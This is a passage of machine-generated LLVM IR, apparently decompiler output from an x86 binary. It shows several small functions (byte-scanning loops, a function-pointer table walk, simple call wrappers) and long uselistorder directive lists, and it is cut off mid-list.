  %v3_80527ed = add i32 %v0_80527eb, 1
  %v4_80527ed = add i32 %v3_80527ed, %v2_80527ed
  br label %dec_label_pc_80527f5

dec_label_pc_80527f2:                             ; preds = %dec_label_pc_8052784, %dec_label_pc_8052724
  br label %dec_label_pc_80527f5

dec_label_pc_80527f5:                             ; preds = %dec_label_pc_80527e6, %dec_label_pc_80527f2
  %storemerge = phi i32 [ %v4_80527ed, %dec_label_pc_80527e6 ], [ -1, %dec_label_pc_80527f2 ]
  store i32 %v0_8052726, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80527a1.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_80527da, { 1, 0 }
  uselistorder i32 %v2_8052780, { 0, 2, 1 }
  uselistorder i32 %v4_8052772, { 0, 2, 1 }
  uselistorder i32 %v5_80527da36, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 2, 6, 9, 3, 0, 8, 7, 5, 1, 4 }
  uselistorder i8 46, { 6, 7, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i16*, i32, i32)* @function_804d4b8, { 3, 4, 5, 6, 8, 9, 16, 11, 12, 17, 18, 20, 0, 1, 10, 7, 13, 14, 15, 19, 2 }
  uselistorder i32* @edi, { 3, 73, 74, 20, 75, 76, 77, 19, 78, 147, 148, 79, 80, 2, 0, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 22, 5, 4, 23, 24, 25, 26, 27, 28, 29, 30, 31, 96, 7, 97, 8, 98, 99, 6, 100, 101, 102, 103, 108, 109, 1, 104, 105, 106, 107, 207, 9, 208, 209, 210, 110, 111, 112, 113, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 32, 33, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 10, 222, 223, 224, 225, 226, 227, 228, 266, 267, 268, 11, 269, 270, 273, 274, 53, 54, 275, 276, 277, 278, 279, 280, 21, 281, 290, 58, 12, 59, 60, 61, 34, 35, 36, 37, 38, 39, 40, 62, 63, 64, 65, 66, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 41, 42, 43, 44, 45, 46, 47, 194, 195, 196, 197, 198, 199, 200, 201, 13, 202, 203, 204, 205, 206, 130, 131, 14, 132, 133, 134, 135, 136, 137, 138, 114, 115, 116, 117, 229, 230, 15, 231, 232, 233, 288, 289, 234, 235, 236, 16, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 139, 140, 141, 142, 159, 160, 161, 237, 238, 239, 240, 241, 242, 243, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 17, 258, 48, 49, 50, 244, 18, 245, 246, 284, 285, 286, 287, 162, 163, 164, 165, 166, 167, 55, 56, 57, 259, 260, 261, 262, 168, 169, 170, 171, 174, 175, 176, 271, 272, 67, 68, 282, 283, 172, 173, 51, 52, 69, 70, 71, 72, 143, 144, 145, 146, 177, 178, 263, 264, 265 }
  uselistorder i32 256, { 6, 7, 8, 9, 10, 11, 12, 50, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 49, 24, 25, 26, 27, 28, 0, 1, 29, 2, 51, 57, 52, 30, 31, 58, 32, 33, 5, 54, 55, 3, 34, 4, 35, 36, 53, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 56, 47, 48 }
  uselistorder i1 true, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 2, 3, 4 }
  uselistorder i32* @edx, { 2, 40, 41, 42, 43, 44, 45, 46, 47, 15, 51, 49, 50, 52, 53, 54, 55, 56, 57, 58, 17, 18, 19, 20, 21, 59, 60, 61, 62, 63, 64, 65, 72, 66, 67, 68, 69, 70, 71, 0, 16, 165, 166, 97, 167, 168, 169, 170, 171, 212, 76, 73, 74, 75, 77, 78, 79, 80, 81, 3, 22, 172, 173, 98, 99, 4, 100, 101, 102, 103, 174, 175, 176, 177, 178, 179, 214, 215, 216, 217, 5, 218, 219, 221, 113, 222, 114, 25, 26, 23, 223, 224, 96, 115, 227, 228, 230, 229, 225, 112, 27, 118, 119, 6, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 7, 133, 134, 116, 117, 28, 8, 29, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 9, 160, 161, 162, 163, 164, 82, 83, 85, 86, 87, 35, 1, 10, 48, 84, 180, 88, 104, 105, 106, 107, 181, 182, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 14, 200, 201, 183, 202, 11, 203, 204, 206, 12, 207, 208, 209, 210, 211, 30, 13, 205, 226, 108, 109, 110, 220, 213, 231, 24, 31, 32, 33, 34, 36, 37, 38, 39, 89, 90, 91, 92, 93, 94, 95, 111, 232 }
  uselistorder i32* @esi, {}
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_80527f5, { 1, 0 }
}

define i32 @function_8052800(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052800:
  %v1_805280e = icmp eq i32 %arg1, 0
  br i1 %v1_805280e, label %dec_label_pc_805283d, label %dec_label_pc_805282e.preheader

dec_label_pc_805282e.preheader:                   ; preds = %dec_label_pc_8052800
  store i32 %arg2, i32* @ecx, align 4
  %v2_805282e10 = add i32 %arg2, %arg1
  %v3_805282e11 = inttoptr i32 %v2_805282e10 to i8*
  %v4_805282e12 = load i8, i8* %v3_805282e11, align 1
  %v1_805283214 = add i32 %arg2, 1
  %v1_805283515 = icmp eq i8 %v4_805282e12, 0
  %v1_805283716 = icmp eq i1 %v1_805283515, false
  br i1 %v1_805283716, label %dec_label_pc_805281d, label %dec_label_pc_8052839

dec_label_pc_8052814:                             ; preds = %dec_label_pc_805281d
  %v1_8052814 = add i32 %v0_805281417, 2
  br label %dec_label_pc_8052839

dec_label_pc_805281d:                             ; preds = %dec_label_pc_805282e.preheader, %dec_label_pc_805282e
  %v1_805283219 = phi i32 [ %v1_8052832, %dec_label_pc_805282e ], [ %v1_805283214, %dec_label_pc_805282e.preheader ]
  %v5_805282e18.in = phi i8 [ %v4_805282e, %dec_label_pc_805282e ], [ %v4_805282e12, %dec_label_pc_805282e.preheader ]
  %v0_805281417 = phi i32 [ %v2_805282b, %dec_label_pc_805282e ], [ %arg2, %dec_label_pc_805282e.preheader ]
  %v5_805282e18 = zext i8 %v5_805282e18.in to i32
  %v1_805281f = and i32 %v5_805282e18, 192
  %v6_8052824 = icmp eq i32 %v1_805281f, 192
  %v2_805282b = add i32 %v5_805282e18, %v1_805283219
  br i1 %v6_8052824, label %dec_label_pc_8052814, label %dec_label_pc_805282e

dec_label_pc_805282e:                             ; preds = %dec_label_pc_805281d
  store i32 %v2_805282b, i32* @ecx, align 4
  %v2_805282e = add i32 %v2_805282b, %arg1
  %v3_805282e = inttoptr i32 %v2_805282e to i8*
  %v4_805282e = load i8, i8* %v3_805282e, align 1
  %v1_8052832 = add i32 %v2_805282b, 1
  %v1_8052835 = icmp eq i8 %v4_805282e, 0
  %v1_8052837 = icmp eq i1 %v1_8052835, false
  br i1 %v1_8052837, label %dec_label_pc_805281d, label %dec_label_pc_8052839

dec_label_pc_8052839:                             ; preds = %dec_label_pc_805282e.preheader, %dec_label_pc_805282e, %dec_label_pc_8052814
  %v0_8052839 = phi i32 [ %v1_8052814, %dec_label_pc_8052814 ], [ %v1_805283214, %dec_label_pc_805282e.preheader ], [ %v1_8052832, %dec_label_pc_805282e ]
  %v2_805283b = sub i32 %v0_8052839, %arg2
  br label %dec_label_pc_805283d

dec_label_pc_805283d:                             ; preds = %dec_label_pc_8052800, %dec_label_pc_8052839
  %v0_8052840 = phi i32 [ -1, %dec_label_pc_8052800 ], [ %v2_805283b, %dec_label_pc_8052839 ]
  ret i32 %v0_8052840

; uselistorder directives
  uselistorder i8 %v4_805282e, { 1, 0 }
  uselistorder i32 %v2_805282b, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 2, { 94, 32, 95, 55, 99, 100, 29, 30, 31, 0, 1, 96, 101, 102, 103, 85, 104, 105, 106, 107, 108, 109, 87, 2, 88, 89, 35, 110, 111, 3, 56, 36, 125, 126, 51, 112, 113, 114, 115, 86, 116, 117, 39, 127, 128, 52, 8, 9, 42, 43, 53, 135, 40, 84, 7, 57, 78, 58, 79, 59, 80, 37, 10, 91, 34, 60, 11, 12, 44, 13, 14, 90, 15, 16, 17, 45, 124, 18, 19, 54, 20, 61, 118, 119, 120, 121, 4, 46, 92, 38, 97, 98, 21, 136, 47, 5, 6, 129, 130, 41, 22, 23, 131, 24, 132, 25, 48, 133, 134, 26, 123, 137, 62, 64, 63, 81, 66, 65, 67, 69, 68, 82, 49, 71, 50, 70, 83, 93, 27, 73, 28, 72, 33, 122, 75, 74, 76, 77 }
  uselistorder i8 0, { 28, 3, 6, 7, 29, 5, 4, 65, 66, 67, 9, 74, 69, 70, 8, 72, 73, 71, 22, 75, 0, 1, 42, 43, 44, 76, 77, 24, 78, 10, 12, 46, 45, 11, 30, 79, 80, 106, 127, 128, 15, 86, 82, 83, 81, 13, 84, 85, 14, 23, 87, 88, 89, 90, 91, 92, 93, 94, 95, 17, 48, 47, 16, 49, 50, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 2, 145, 146, 147, 183, 148, 186, 31, 39, 26, 27, 57, 18, 185, 118, 119, 51, 120, 121, 122, 123, 124, 125, 32, 126, 59, 19, 68, 149, 150, 40, 151, 96, 97, 98, 107, 108, 109, 110, 111, 152, 153, 154, 155, 156, 157, 158, 159, 160, 20, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 21, 174, 175, 176, 177, 178, 179, 180, 181, 52, 184, 112, 113, 114, 182, 115, 116, 53, 54, 55, 56, 58, 60, 61, 62, 63, 64, 99, 100, 101, 102, 103, 104, 105, 117, 187, 188, 25, 41, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* @ecx, { 24, 5, 7, 23, 6, 46, 47, 12, 48, 49, 50, 51, 13, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 33, 34, 35, 36, 37, 38, 39, 40, 68, 69, 70, 8, 9, 41, 1, 138, 195, 11, 16, 71, 72, 14, 10, 15, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 2, 42, 139, 140, 29, 141, 86, 87, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 25, 167, 168, 169, 170, 26, 171, 22, 196, 197, 198, 199, 28, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 17, 115, 91, 92, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 18, 131, 132, 134, 135, 136, 137, 133, 83, 0, 172, 30, 31, 84, 88, 173, 174, 175, 176, 177, 178, 179, 27, 180, 181, 182, 183, 184, 185, 19, 20, 3, 4, 186, 187, 21, 188, 189, 190, 191, 192, 194, 43, 44, 193, 200, 89, 45, 201, 85, 32, 90 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805283d, { 1, 0 }
  uselistorder label %dec_label_pc_8052839, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805281d, { 1, 0 }
}

define i32 @function_8052850() local_unnamed_addr {
dec_label_pc_8052850:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805285c = load i32, i32* @global_var_80560a8.174, align 8
  %v10_8052861 = icmp eq i32 %v0_805285c, -1
  br i1 %v10_8052861, label %dec_label_pc_805287c, label %dec_label_pc_8052870.preheader

dec_label_pc_8052870.preheader:                   ; preds = %dec_label_pc_8052850
  br label %dec_label_pc_8052870

dec_label_pc_8052870:                             ; preds = %dec_label_pc_8052870.preheader, %dec_label_pc_8052870
  %v4_8052873 = phi i32 [ %v0_805285c, %dec_label_pc_8052870.preheader ], [ %v2_8052875, %dec_label_pc_8052870 ]
  %v0_8052870 = phi i32 [ ptrtoint (i32* @global_var_80560a8.174 to i32), %dec_label_pc_8052870.preheader ], [ %v1_8052870, %dec_label_pc_8052870 ]
  %v1_8052870 = add i32 %v0_8052870, -4
  call void @__pseudo_call(i32 %v4_8052873)
  %v1_8052875 = inttoptr i32 %v1_8052870 to i32*
  %v2_8052875 = load i32, i32* %v1_8052875, align 4
  %v10_8052877 = icmp eq i32 %v2_8052875, -1
  %v1_805287a = icmp eq i1 %v10_8052877, false
  br i1 %v1_805287a, label %dec_label_pc_8052870, label %dec_label_pc_805287c.loopexit

dec_label_pc_805287c.loopexit:                    ; preds = %dec_label_pc_8052870
  %v2_805287c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805287c

dec_label_pc_805287c:                             ; preds = %dec_label_pc_805287c.loopexit, %dec_label_pc_8052850
  %v2_805287c = phi i32 [ %v2_805287c.pre, %dec_label_pc_805287c.loopexit ], [ %tmp6, %dec_label_pc_8052850 ]
  ret i32 %v2_805287c

; uselistorder directives
  uselistorder i32 %v0_805285c, { 1, 0 }
  uselistorder i1 false, { 468, 175, 6, 2, 3, 8, 176, 177, 179, 178, 7, 181, 180, 182, 191, 26, 27, 186, 190, 188, 189, 36, 183, 184, 187, 192, 193, 194, 195, 196, 72, 74, 75, 76, 77, 73, 78, 79, 80, 33, 81, 34, 82, 197, 198, 203, 28, 199, 200, 202, 201, 204, 205, 210, 209, 206, 207, 208, 9, 0, 10, 83, 84, 85, 37, 211, 212, 213, 286, 287, 288, 355, 356, 357, 289, 29, 290, 358, 359, 360, 319, 136, 219, 30, 11, 214, 215, 216, 217, 218, 220, 221, 31, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 237, 236, 12, 86, 87, 88, 89, 361, 362, 363, 238, 239, 291, 292, 293, 364, 365, 366, 367, 368, 369, 370, 47, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 469, 470, 35, 1, 397, 38, 50, 398, 399, 320, 321, 322, 127, 484, 485, 486, 487, 490, 39, 491, 492, 489, 483, 471, 90, 137, 138, 139, 140, 141, 142, 472, 473, 51, 152, 153, 154, 155, 156, 157, 13, 143, 14, 315, 316, 92, 476, 477, 478, 479, 480, 481, 482, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 323, 93, 94, 95, 96, 97, 98, 99, 100, 101, 336, 337, 338, 339, 340, 341, 342, 343, 344, 24, 346, 345, 350, 347, 348, 349, 15, 351, 352, 240, 241, 243, 244, 163, 4, 5, 166, 165, 164, 16, 488, 185, 400, 401, 40, 402, 17, 242, 245, 403, 246, 247, 248, 249, 250, 251, 252, 296, 294, 295, 18, 32, 297, 299, 298, 41, 300, 302, 301, 42, 303, 253, 254, 304, 128, 48, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 424, 423, 425, 426, 427, 428, 429, 431, 25, 432, 430, 433, 435, 434, 19, 436, 437, 439, 438, 43, 440, 441, 442, 443, 444, 52, 445, 446, 63, 64, 447, 65, 66, 448, 449, 67, 450, 451, 53, 68, 452, 453, 454, 455, 456, 54, 457, 55, 69, 56, 458, 57, 459, 460, 461, 58, 462, 59, 463, 70, 464, 465, 466, 102, 103, 474, 44, 475, 20, 305, 306, 307, 308, 309, 310, 129, 45, 130, 131, 132, 133, 134, 135, 311, 91, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 144, 145, 146, 147, 148, 149, 150, 151, 158, 159, 160, 161, 162, 167, 168, 169, 170, 171, 172, 173, 174, 255, 256, 257, 60, 22, 258, 259, 260, 261, 262, 263, 61, 21, 264, 265, 266, 62, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 23, 278, 279, 280, 281, 282, 49, 283, 284, 285, 312, 313, 314, 317, 318, 353, 354, 467, 493, 71, 46, 494 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 55, 19, 33, 34, 35, 36, 43, 44, 45, 46, 3, 47, 0, 42, 20, 37, 1, 38, 39, 40, 4, 48, 49, 50, 51, 52, 53, 5, 41, 56, 57, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 6, 54 }
  uselistorder i32 ptrtoint (i32* @global_var_80560a8.174 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, {}
  uselistorder i32 1, { 384, 709, 239, 650, 710, 234, 711, 129, 712, 250, 713, 714, 118, 715, 385, 70, 387, 386, 157, 251, 252, 716, 240, 235, 719, 346, 720, 721, 722, 307, 723, 0, 374, 117, 116, 724, 725, 389, 388, 196, 195, 197, 726, 390, 727, 391, 194, 728, 729, 392, 226, 225, 227, 657, 658, 659, 660, 661, 662, 663, 664, 665, 397, 396, 395, 394, 393, 114, 113, 112, 115, 666, 667, 401, 400, 399, 398, 162, 160, 163, 159, 161, 164, 280, 730, 731, 230, 732, 733, 253, 734, 308, 735, 736, 402, 94, 281, 740, 737, 738, 739, 241, 405, 404, 403, 103, 102, 668, 669, 670, 254, 671, 741, 742, 743, 406, 211, 210, 212, 213, 309, 744, 22, 800, 407, 93, 255, 256, 143, 145, 144, 146, 257, 408, 147, 282, 1, 410, 409, 71, 72, 411, 190, 412, 155, 283, 284, 413, 285, 286, 414, 312, 415, 231, 745, 746, 236, 747, 258, 242, 748, 750, 751, 752, 753, 754, 755, 259, 418, 417, 416, 756, 757, 758, 759, 760, 761, 762, 763, 2, 764, 260, 765, 766, 767, 261, 768, 769, 262, 770, 771, 772, 773, 774, 313, 421, 420, 419, 69, 67, 68, 287, 288, 775, 776, 777, 778, 243, 672, 673, 674, 135, 422, 856, 423, 24, 25, 289, 801, 375, 214, 315, 857, 858, 859, 263, 314, 424, 860, 861, 862, 264, 863, 864, 436, 435, 434, 433, 432, 431, 430, 429, 428, 427, 426, 425, 209, 208, 201, 202, 207, 203, 200, 206, 204, 205, 865, 866, 3, 87, 86, 85, 84, 83, 437, 192, 193, 438, 137, 136, 867, 868, 439, 152, 151, 153, 901, 902, 903, 440, 98, 96, 97, 95, 441, 869, 442, 42, 39, 41, 37, 38, 40, 290, 291, 445, 444, 443, 446, 32, 447, 165, 448, 449, 154, 92, 450, 126, 452, 451, 46, 453, 73, 454, 224, 455, 222, 456, 188, 457, 186, 458, 189, 459, 460, 61, 461, 82, 463, 462, 62, 464, 74, 465, 223, 89, 467, 466, 166, 468, 472, 471, 470, 469, 158, 906, 907, 908, 475, 474, 473, 34, 35, 909, 292, 477, 476, 480, 479, 478, 215, 293, 353, 646, 4, 486, 485, 484, 483, 482, 481, 76, 77, 904, 489, 488, 487, 81, 79, 80, 316, 490, 697, 698, 699, 700, 491, 29, 28, 31, 30, 26, 27, 294, 492, 16, 17, 691, 651, 237, 692, 354, 693, 376, 493, 20, 19, 18, 21, 494, 174, 172, 170, 171, 176, 175, 173, 59, 56, 58, 60, 55, 57, 317, 496, 495, 318, 497, 319, 498, 320, 501, 500, 499, 355, 504, 503, 502, 191, 321, 823, 824, 825, 505, 128, 826, 827, 244, 828, 829, 830, 180, 178, 179, 356, 822, 265, 218, 219, 221, 220, 322, 295, 675, 676, 677, 678, 508, 507, 506, 183, 182, 181, 184, 323, 831, 832, 833, 834, 835, 836, 837, 838, 839, 266, 840, 841, 842, 843, 844, 298, 845, 846, 229, 299, 847, 848, 849, 850, 296, 297, 851, 852, 853, 511, 510, 509, 132, 131, 130, 134, 133, 357, 512, 513, 514, 515, 516, 517, 518, 519, 779, 5, 780, 324, 249, 325, 784, 6, 524, 523, 522, 521, 520, 63, 64, 525, 526, 702, 703, 704, 245, 300, 705, 529, 528, 527, 47, 530, 749, 531, 104, 717, 718, 870, 871, 382, 532, 127, 872, 781, 782, 783, 534, 533, 45, 44, 43, 785, 786, 535, 101, 100, 99, 911, 536, 141, 140, 142, 537, 538, 301, 787, 788, 789, 377, 66, 65, 802, 803, 804, 267, 36, 326, 327, 328, 805, 539, 329, 330, 806, 268, 7, 541, 540, 185, 331, 790, 791, 542, 169, 167, 168, 332, 543, 78, 302, 544, 139, 138, 873, 874, 647, 270, 875, 876, 877, 878, 879, 881, 882, 883, 271, 884, 885, 358, 269, 886, 272, 887, 888, 889, 880, 548, 547, 546, 545, 51, 53, 52, 48, 49, 50, 54, 890, 549, 111, 108, 110, 109, 273, 550, 891, 892, 552, 551, 120, 119, 893, 894, 652, 653, 303, 895, 304, 896, 897, 898, 274, 899, 333, 900, 555, 554, 553, 121, 125, 123, 122, 124, 275, 334, 8, 335, 556, 557, 150, 149, 905, 559, 558, 216, 217, 305, 910, 560, 198, 336, 228, 337, 807, 808, 809, 810, 811, 812, 813, 814, 815, 564, 563, 562, 561, 75, 338, 276, 339, 340, 310, 348, 568, 567, 566, 565, 33, 341, 571, 570, 569, 574, 573, 572, 23, 575, 342, 816, 817, 343, 344, 818, 577, 576, 579, 578, 91, 580, 88, 581, 156, 583, 582, 90, 584, 177, 585, 199, 586, 187, 587, 148, 359, 588, 360, 361, 362, 363, 306, 589, 594, 593, 592, 591, 590, 679, 680, 595, 681, 238, 682, 683, 684, 685, 686, 687, 688, 689, 690, 378, 596, 597, 694, 364, 365, 373, 383, 379, 603, 602, 601, 600, 599, 598, 695, 696, 366, 604, 367, 605, 648, 614, 613, 612, 380, 611, 610, 609, 608, 607, 606, 701, 345, 368, 615, 649, 369, 616, 622, 621, 620, 619, 618, 617, 623, 706, 232, 233, 707, 708, 9, 625, 624, 107, 10, 11, 12, 626, 13, 792, 793, 277, 247, 794, 795, 796, 654, 278, 246, 797, 798, 655, 370, 631, 630, 629, 628, 627, 105, 106, 311, 632, 279, 799, 656, 371, 372, 638, 637, 636, 635, 634, 633, 819, 820, 821, 639, 381, 248, 14, 347, 854, 15, 855, 641, 640, 349, 912, 913, 350, 914, 915, 351, 352, 916, 917, 642, 644, 643, 645 }
  uselistorder label %dec_label_pc_8052870, { 1, 0 }
}

define i32 @function_8052884() local_unnamed_addr {
entry:
  %v0_8052887 = load i32, i32* @ebx, align 4
  %v1_8052888 = call i32 @function_80480b0(i32 %v0_8052887)
  store i32 %v1_8052888, i32* @eax, align 4
  %v0_8052893 = call i32 @function_80480c0()
  ret i32 %v0_8052893

; uselistorder directives
  uselistorder i32* @eax, { 11, 34, 111, 2, 112, 113, 1, 114, 0, 33, 110, 115, 35, 116, 68, 69, 70, 46, 71, 117, 122, 118, 119, 120, 121, 3, 4, 185, 186, 175, 196, 123, 38, 36, 124, 37, 125, 126, 127, 128, 39, 40, 129, 130, 41, 131, 42, 132, 43, 63, 64, 133, 134, 135, 136, 65, 137, 138, 139, 140, 44, 148, 14, 198, 199, 66, 200, 201, 203, 67, 204, 5, 202, 8, 10, 197, 87, 12, 72, 73, 172, 74, 176, 178, 179, 177, 75, 76, 180, 181, 183, 184, 182, 141, 45, 102, 103, 104, 105, 106, 6, 149, 150, 151, 55, 152, 153, 154, 155, 156, 142, 143, 157, 158, 79, 80, 187, 189, 188, 190, 191, 193, 77, 192, 159, 160, 56, 161, 162, 81, 82, 83, 15, 16, 84, 17, 85, 86, 163, 57, 58, 164, 165, 166, 167, 59, 168, 78, 13, 18, 19, 88, 89, 90, 91, 20, 92, 21, 22, 23, 93, 24, 94, 95, 96, 25, 97, 26, 27, 28, 98, 29, 99, 100, 101, 30, 31, 32, 107, 108, 109, 62, 144, 145, 47, 48, 146, 147, 49, 50, 51, 52, 53, 54, 169, 60, 170, 61, 171, 173, 174, 205, 194, 195, 7, 9 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 598, 14, 15, 16, 94, 47, 402, 599, 602, 600, 601, 403, 41, 727, 796, 797, 244, 613, 605, 607, 608, 20, 38, 609, 610, 611, 404, 612, 102, 103, 104, 603, 604, 111, 614, 615, 617, 618, 616, 619, 209, 620, 621, 622, 623, 624, 625, 113, 114, 405, 259, 260, 491, 406, 492, 112, 493, 494, 495, 496, 497, 498, 50, 51, 499, 500, 501, 396, 502, 49, 407, 48, 408, 115, 116, 409, 17, 410, 503, 18, 411, 117, 261, 412, 413, 118, 414, 628, 415, 626, 198, 627, 262, 263, 119, 120, 39, 416, 629, 630, 631, 632, 633, 264, 417, 418, 21, 52, 505, 89, 90, 419, 634, 53, 420, 22, 421, 798, 265, 728, 729, 730, 799, 800, 13, 210, 122, 121, 801, 802, 211, 803, 422, 731, 732, 423, 804, 424, 805, 806, 807, 808, 635, 764, 123, 425, 0, 504, 1, 1014, 548, 549, 124, 266, 641, 636, 637, 638, 640, 97, 23, 642, 643, 644, 645, 646, 647, 653, 654, 655, 656, 648, 649, 650, 651, 652, 54, 55, 426, 657, 658, 56, 57, 58, 427, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 125, 677, 678, 126, 679, 680, 681, 59, 98, 212, 105, 428, 99, 809, 127, 810, 24, 100, 91, 811, 184, 128, 812, 92, 813, 733, 734, 735, 267, 736, 429, 814, 268, 815, 816, 817, 818, 819, 820, 821, 129, 430, 822, 823, 824, 825, 130, 826, 431, 183, 269, 131, 432, 433, 434, 132, 827, 213, 828, 829, 830, 831, 214, 255, 256, 832, 833, 834, 835, 836, 837, 435, 215, 838, 93, 436, 839, 133, 216, 217, 840, 841, 437, 842, 843, 844, 845, 87, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 2, 185, 134, 218, 846, 101, 847, 186, 438, 439, 848, 135, 849, 535, 1026, 765, 766, 767, 270, 768, 536, 1027, 106, 219, 550, 769, 517, 1028, 509, 1029, 1030, 1031, 510, 1032, 537, 506, 1033, 1034, 1035, 721, 1036, 136, 1037, 1048, 1049, 25, 440, 3, 110, 441, 442, 1055, 1059, 187, 1060, 137, 375, 271, 272, 1054, 4, 1038, 1039, 1040, 138, 507, 395, 139, 443, 551, 5, 220, 221, 140, 552, 553, 141, 142, 555, 554, 556, 557, 273, 376, 558, 560, 559, 561, 1041, 1042, 143, 444, 1047, 579, 580, 581, 582, 445, 446, 583, 584, 585, 222, 144, 145, 447, 511, 448, 512, 146, 449, 147, 450, 562, 60, 563, 564, 565, 566, 567, 6, 451, 763, 452, 513, 514, 515, 516, 453, 148, 1050, 377, 149, 223, 1051, 1053, 1052, 772, 224, 773, 774, 775, 776, 225, 777, 778, 779, 274, 770, 275, 771, 276, 454, 518, 107, 519, 226, 455, 520, 456, 457, 277, 378, 458, 278, 379, 150, 459, 780, 781, 151, 152, 279, 380, 109, 42, 43, 782, 783, 784, 785, 786, 787, 153, 154, 280, 381, 108, 788, 188, 789, 95, 790, 791, 793, 460, 792, 682, 461, 227, 683, 462, 684, 685, 686, 688, 689, 690, 691, 692, 693, 694, 695, 696, 594, 595, 26, 281, 228, 61, 155, 156, 11, 12, 229, 1056, 1058, 157, 639, 606, 7, 158, 850, 851, 282, 852, 159, 463, 853, 189, 854, 62, 687, 230, 231, 160, 855, 856, 857, 697, 698, 699, 700, 161, 737, 63, 464, 738, 465, 740, 739, 190, 466, 467, 741, 743, 742, 191, 468, 701, 744, 538, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 162, 469, 870, 232, 871, 872, 873, 874, 875, 27, 28, 470, 201, 202, 876, 877, 878, 879, 163, 880, 881, 882, 471, 883, 29, 30, 164, 472, 884, 885, 886, 889, 887, 888, 31, 44, 64, 890, 891, 892, 893, 257, 894, 895, 165, 896, 897, 898, 899, 900, 901, 902, 903, 167, 904, 905, 906, 473, 907, 908, 192, 193, 909, 910, 911, 168, 166, 912, 169, 913, 914, 474, 915, 916, 917, 918, 919, 920, 921, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 170, 475, 476, 171, 934, 935, 936, 477, 478, 937, 938, 939, 940, 941, 942, 943, 944, 479, 480, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 481, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 233, 482, 234, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 235, 986, 987, 988, 989, 990, 991, 992, 32, 65, 66, 67, 68, 993, 994, 995, 996, 997, 998, 172, 999, 483, 1000, 1001, 1002, 1003, 382, 1004, 1005, 1006, 1007, 1008, 1009, 173, 484, 96, 40, 88, 922, 194, 1043, 1044, 195, 1046, 1045, 69, 283, 485, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 236, 755, 174, 486, 487, 756, 176, 177, 175, 383, 178, 384, 539, 196, 540, 541, 237, 238, 542, 385, 543, 203, 386, 544, 179, 545, 546, 547, 1010, 180, 757, 488, 759, 1025, 586, 722, 1015, 1057, 1016, 508, 794, 758, 521, 387, 284, 285, 286, 287, 288, 289, 522, 523, 70, 388, 524, 525, 526, 527, 528, 529, 530, 531, 290, 532, 200, 74, 73, 8, 239, 533, 534, 199, 72, 71, 9, 240, 291, 204, 245, 568, 569, 570, 571, 397, 